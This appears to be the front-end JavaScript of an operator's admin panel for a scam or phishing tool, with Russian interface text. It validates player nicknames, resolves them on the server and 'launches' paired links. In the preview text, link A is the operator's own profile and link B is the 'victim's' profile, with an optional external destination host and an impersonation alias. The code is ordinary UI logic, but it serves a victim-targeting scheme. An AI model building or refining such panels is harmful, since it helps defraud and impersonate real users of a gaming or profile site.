//не удалять
// admin.js — panel interactions: copy, confirm, destination preview. No framework.
(() => {
  const $ = (sel, root = document) => root.querySelector(sel);

  // ---- copy to clipboard -------------------------------------------------
  const announce = (msg) => {
    const region = $('[data-testid=copy-status]');
    if (region) region.textContent = msg;
  };

  // navigator.clipboard is unavailable on insecure http origins; execCommand
  // still copies under a user gesture there. prompt() is the last resort.
  const copy_text = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      return true;
    } catch { /* insecure origin or denied — fall through */ }
    try {
      const ta = document.createElement('textarea');
      ta.value = text;
      ta.style.cssText = 'position:fixed;top:-100vh;opacity:0';
      document.body.appendChild(ta);
      ta.select();
      const ok = document.execCommand('copy');
      ta.remove();
      return ok;
    } catch {
      return false;
    }
  };

  document.addEventListener('click', async (ev) => {
    const target = ev.target.closest('[data-copy]');
    if (!target) return;
    const id = target.getAttribute('data-copy');
    const url = new URL('/players/' + id, location.origin).href;
    const label = target.textContent;
    if (await copy_text(url)) {
      target.textContent = 'OK';
      announce('Ссылка скопирована: ' + url);
      setTimeout(() => { target.textContent = label; }, 1200);
    } else {
      window.prompt('Скопируй ссылку:', url);
      announce('Буфер недоступен, ссылка показана для ручного копирования.');
    }
  });

  // ---- confirm destructive actions --------------------------------------
  document.addEventListener('submit', (ev) => {
    const message = ev.target.getAttribute('data-confirm');
    if (message && !window.confirm(message)) ev.preventDefault();
  });

  // ---- panel form: destination + preview + display name ------------------
  const form = $('[data-testid=launch-form]');
  if (!form) return;

  const type = $('[data-testid=destination-type]', form);
  const url = $('[data-testid=destination-url]', form);
  const preview = $('[data-testid=preview]', form);
  const claim = $('[data-testid=claim-select]', form);
  const display = $('[data-testid=display-nick]', form);

  const host_of = (value) => {
    try { return new URL(value).hostname; } catch { return ''; }
  };

  const sync_destination = () => {
    if (!type) return;
    const external = type.value === 'external';
    url.disabled = !external;
    url.required = external;
    render_preview();
  };

  const render_preview = () => {
    if (!preview) return;
    const where = type && type.value === 'external'
      ? (host_of(url.value) ? '→ ' + host_of(url.value) : '→ укажи адрес назначения')
      : '→ внутренняя страница';
    preview.innerHTML = 'Две ссылки: <code>А</code> — мой профиль · <code>Б</code> — профиль жертвы · ' + where;
  };

  const sync_alias = () => {
    if (!claim || !display) return;
    const opt = claim.options[claim.selectedIndex];
    display.value = opt ? (opt.getAttribute('data-alias') || '') : '';
  };

  if (type) type.addEventListener('change', sync_destination);
  if (url) url.addEventListener('input', render_preview);
  if (claim) claim.addEventListener('change', sync_alias);

  sync_destination();
  sync_alias();

  // ---- link creation: staged progress under the ЗАПУСТИТЬ submit ----------
  // The server resolves each typed nickname first (the same call the launch
  // route makes, and it caches — TTL-based), so the bar follows actual work.
  // The last beat stays a normal form POST; errors mirror the server wording.
  const overlay = $('[data-testid=launch-progress]');
  if (!overlay) return;
  const fill = $('[data-testid=launch-progress-fill]', overlay);
  const step_text = $('[data-testid=launch-progress-step]', overlay);
  const launch_btn = $('button[type=submit]', form);

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  // every beat keeps its minimum so a cached resolve doesn't flash the bar
  const settle = (work, ms) => Promise.all([work, sleep(ms)]).then(([value]) => value);

  const NICK_RE = /^[A-Za-z0-9_\-]{1,32}$/;
  const FIELD_MSG = (n) => `Поле ${n}: 1–32 символа, латиница, цифры, _ или -`;

  const banner_error = (message) => {
    let el = $('[data-testid=banner-error]');
    if (!el) {
      el = document.createElement('p');
      el.className = 'banner error';
      el.setAttribute('role', 'alert');
      el.setAttribute('data-testid', 'banner-error');
      form.after(el);
    }
    el.textContent = message;
  };

  // on failure the overlay folds instantly: the banner under the form and the
  // typed values carry the full server wording, exactly as the native route did
  const fail_now = (message) => {
    overlay.hidden = true;
    fill.style.width = '7%';
    fill.classList.remove('lp-fail');
    launch_btn.disabled = false;
    banner_error(message);
  };

  // resolves through the same route the launch handler uses afterwards
  const collect_nickname = async (nick, csrf) => {
    const body = new URLSearchParams({ csrf, nickname: nick });
    const res = await fetch('/admin/players/resolve', { method: 'POST', body, credentials: 'same-origin' });
    const landing = new URL(res.url, location.origin);
    const err = landing.searchParams.get('error');
    if (err) throw new Error(err);
    if (!res.ok) throw new Error('Сервер ответил ' + res.status + ' — попробуй ещё раз.');
  };

  form.addEventListener('submit', (ev) => {
    ev.preventDefault();

    // a new attempt erases the previous result banners — otherwise the next
    // stage's failure mask read the leftovers of this/last run
    for (const b of form.parentElement.querySelectorAll('[data-testid=banner-ok],[data-testid=banner-error]')) b.remove();

    const nick_a = String($('input[name=player_a]', form).value || '').trim();
    const nick_b = String($('input[name=player_b]', form).value || '').trim();
    const csrf = String($('input[name=csrf]', form).value || '');

    const local_err = !NICK_RE.test(nick_a) ? FIELD_MSG('A')
      : nick_b && !NICK_RE.test(nick_b) ? FIELD_MSG('B') : '';
    if (local_err) return banner_error(local_err);

    overlay.hidden = false;
    fill.classList.remove('lp-fail');
    fill.style.width = '7%';
    launch_btn.disabled = true;

    (async () => {
      try {
        step_text.textContent = 'Загружаю профиль «' + nick_a + '»…';
        fill.style.width = '25%';
        await settle(collect_nickname(nick_a, csrf), 600).catch((e) => {
          throw new Error(`Профиль «${nick_a}» не найден: ${e.message}`);
        });
        fill.style.width = '58%';
        if (nick_b) {
          step_text.textContent = 'Загружаю профиль «' + nick_b + '»…';
          await settle(collect_nickname(nick_b, csrf), 600).catch((e) => {
            throw new Error(`Профиль «${nick_b}» не найден: ${e.message}`);
          });
          fill.style.width = '82%';
        }
        step_text.textContent = 'Собираю страницу…';
        fill.style.width = '96%';
        await sleep(320);
        form.submit();
      } catch (e) {
        fail_now(e.message);
      }
    })();
  });
})();
